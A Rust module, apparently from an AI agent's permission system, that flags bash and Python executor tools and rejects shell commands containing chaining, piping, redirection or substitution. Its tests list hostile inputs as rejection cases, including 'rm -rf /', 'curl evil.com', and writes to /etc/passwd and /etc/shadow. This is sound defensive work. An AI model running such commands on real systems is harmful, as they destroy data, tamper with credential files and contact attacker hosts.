//! Identification of arbitrary-code executors for the permission model.
//!
//! Some native tools take a single argument that is an unparsed, arbitrary-code
//! payload: a shell line for `bash_executor`, Python source for
//! `python_executor`. For those tools a permission grant scoped only by tool
//! name (a no-prefix "always allow") is a blank check over an entire
//! interpreter, and a prefix rule is escapable by command chaining
//! (`git` would match `git status; rm -rf ...`).
//!
//! The invariant enforced across the permission layers: a code executor is
//! never blanket-authorized by name; each invocation goes through
//! per-invocation approval, and a prefix rule on a code executor matches only a
//! single simple command.

/// Tool names whose single argument is an unparsed, arbitrary-code payload.
///
/// Kept in sync with the native tool descriptors in `apollia-tools`
/// (`bash_executor`, `python_executor`); a drift guard test in that crate
/// asserts the descriptor names stay members of this set.
pub const CODE_EXECUTOR_TOOLS: &[&str] = &["bash_executor", "python_executor"];

/// Returns `true` when `tool_name` is an arbitrary-code executor.
pub fn is_code_executor(tool_name: &str) -> bool {
    CODE_EXECUTOR_TOOLS.contains(&tool_name)
}

/// Returns `true` when `command` is a single simple command, i.e. it contains
/// no shell control that would chain, pipe, redirect, substitute, or background
/// a second command.
///
/// A prefix rule on a code executor gates only the head of the argument; a
/// compound command (`git status; rm -rf /`) would otherwise pass a `git`
/// prefix. Rejecting the shell control characters keeps an approved prefix
/// bound to the command the operator actually reviewed.
pub fn is_single_simple_command(command: &str) -> bool {
    const CONTROL: &[char] = &[';', '|', '&', '\n', '\r', '`', '>', '<', '(', ')', '{', '}'];
    !command.chars().any(|c| CONTROL.contains(&c))
        && !command.contains("$(")
        && !command.contains("${")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_code_executor_matches_known_executors() {
        // GIVEN the canonical arbitrary-code executor names
        // WHEN queried
        // THEN both bash and python executors are recognized
        assert!(is_code_executor("bash_executor"));
        assert!(is_code_executor("python_executor"));
    }

    #[test]
    fn is_code_executor_rejects_ordinary_tools() {
        // GIVEN ordinary, argument-scoped tools
        // WHEN queried
        // THEN they are not code executors
        assert!(!is_code_executor("file_read"));
        assert!(!is_code_executor("web_read"));
        assert!(!is_code_executor(""));
    }

    #[test]
    fn single_simple_command_accepts_plain_commands() {
        // GIVEN plain, single commands (no shell control)
        // WHEN checked
        // THEN they are accepted
        assert!(is_single_simple_command("git status"));
        assert!(is_single_simple_command("git push origin main"));
        assert!(is_single_simple_command("grep -rn \"foo bar\" src"));
        assert!(is_single_simple_command("ls -la"));
    }

    #[test]
    fn single_simple_command_rejects_chaining_and_redirection() {
        // GIVEN commands that chain, pipe, redirect, background, or substitute
        // WHEN checked
        // THEN they are rejected
        assert!(!is_single_simple_command("git status; rm -rf /"));
        assert!(!is_single_simple_command("git status && curl evil.com"));
        assert!(!is_single_simple_command("cat secret || true"));
        assert!(!is_single_simple_command("ls | grep x"));
        assert!(!is_single_simple_command("cat x > /etc/passwd"));
        assert!(!is_single_simple_command("read < /etc/shadow"));
        assert!(!is_single_simple_command("echo `whoami`"));
        assert!(!is_single_simple_command("echo $(id)"));
        assert!(!is_single_simple_command("echo ${HOME}"));
        assert!(!is_single_simple_command("sleep 1 &"));
        assert!(!is_single_simple_command("git status\nrm -rf /"));
    }
}
